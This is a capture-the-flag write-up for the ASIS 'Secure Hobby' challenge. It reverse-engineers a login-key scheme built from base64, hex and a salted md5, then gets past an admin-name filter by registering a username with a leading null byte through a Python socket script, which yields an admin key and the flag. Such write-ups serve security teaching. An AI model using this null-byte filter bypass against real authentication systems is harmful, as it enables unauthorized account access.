### Solved by barrebas

For Secure Hobby, a 250 point challenge, we where given a file and a place to connect to. The archive contained a binary, which looked okay enough to run. It opened a port on localhost. Upon connecting using ```nc```, the program first crashes because it can't find ```flag``` and ```namak```. After creating those files and connecting again, we are presented with the following:

```bash
$ nc localhost 35565
-------------------------------------------------
| 	Welcome to Super Secure Auth Engine	|
-------------------------------------------------

1) Register
2) Login check
3) Show my secret

Enjoy ;)
1
Enter username: test
Your key for login is: 6447567a64413d3d098f6bcd4621d373cade4e832627b4f6
```

Hmm. The second function verifies a login and the third displays a secret. Trying to register the user 'admin' resulted in an error. Still, it's fair to assume we need to get the secret of the admin user. Let's break this key down.

```bash
$ echo -ne 'test' |md5sum
098f6bcd4621d373cade4e832627b4f6  -
```

This looks like the last part of the login. What about the start? It seems to end with \x3d, or ASCII ```=```. Screams base64!

```bash
$ xxd -p -r
6447567a64413d3d
dGVzdA==
$ echo -ne 'dGVzdA==' |base64 -d
test
```

So putting it all together again:


```bash
$ echo -ne 'admin' |base64
YWRtaW4=
$ echo -ne 'admin' |md5sum
21232f297a57a5a743894a0e4a801fc3  -
xxd -p
YWRtaW4=
595752746157343d0a
```

Looks like ```595752746157343d21232f297a57a5a743894a0e4a801fc3``` is the login we need!

Alas, this doesn’t work. On the remote box, registering ```test``` returns:


```bash
$ nc asis-ctf.ir 12439
-------------------------------------------------
| 	Welcome to Super Secure Auth Engine	|
-------------------------------------------------

1) Register
2) Login check
3) Show my secret

Enjoy ;)
1
Enter username: test
Your key for login is: 6447567a64413d3dd0211e3e26985465726312d056f9339f
```

It has to do with the ```namak``` file. Namak is Persian for salt.

```bash
$ echo ‘0’ > namak
```

Now, registering test on the localhost server returns ```Your key for login is: 6447567a64413d3d1c13f2701648e0b0d46d8a2a5a131a53```.

Furthermore, it looks like the salt is prepended to before hashing. We grabbed md5(salt) using a small Python script:


```python
#!/usr/bin/python

from socket import *
import time, re, struct

s = socket(AF_INET, SOCK_STREAM)
#s.connect(('localhost', 35565))
s.connect(('asis-ctf.ir', 12439))

print s.recv(256)

s.send('1\n')
print s.recv(256)

s.send('\n')

print s.recv(200)
print s.recv(200)
```

The output showed:

```bash
Enter username:
Your key for login is:
5624717e9a5fd673f17f5678c6303ffe
```

So the md5 of the salt would be ```5624717e9a5fd673f17f5678c6303ffe```. I enlisted the help of NullMode to crack this hash, but to no avail.

Instead of cracking this hash (seems inpossible), we decided to focus on the string comparison. We cannot register a username containing ```admin```, but perhaps we can circumvent this checking system somehow. First, I tried:


```
admin                                              #
```

But this led to the same error message. Apparently, the username is not truncated. Instead, we assumed the check-string-for-admin uses normal string routines. These stop when they encounter a null-byte. Hash-functions on the other hand, do not. Let's register a user ```\x00admin``` using Python:


```python
#!/usr/bin/python

from socket import *
import time, re, struct

s = socket(AF_INET, SOCK_STREAM)
#s.connect(('localhost', 35565))
s.connect(('asis-ctf.ir', 12439))

print s.recv(256)

s.send('1\n')
print s.recv(256)

s.send('\x00admin\n')

print s.recv(200)
print s.recv(200)
```

This little gem returned ```4147466b62576c7503812bbd45e23c059a0eab18e936b7ed```. Let's try it out!


```bash
$ nc asis-ctf.ir 12439
-------------------------------------------------
| 	Welcome to Super Secure Auth Engine	|
-------------------------------------------------

1) Register
2) Login check
3) Show my secret

Enjoy ;)
2
Enter key: 4147466b62576c7503812bbd45e23c059a0eab18e936b7ed
OK
User admin authenticated
```

Holy crap, it worked! Let's grab that secret! Fingers crossed:


```bash
$ nc asis-ctf.ir 12439
-------------------------------------------------
| 	Welcome to Super Secure Auth Engine	|
-------------------------------------------------

1) Register
2) Login check
3) Show my secret

Enjoy ;)
3
Enter key: 4147466b62576c7503812bbd45e23c059a0eab18e936b7ed
The flag is: ASIS_65cc76f02093977bfd7629086e813666
```

BOOM! We just landed another flag :) This one was actually fun to solve!
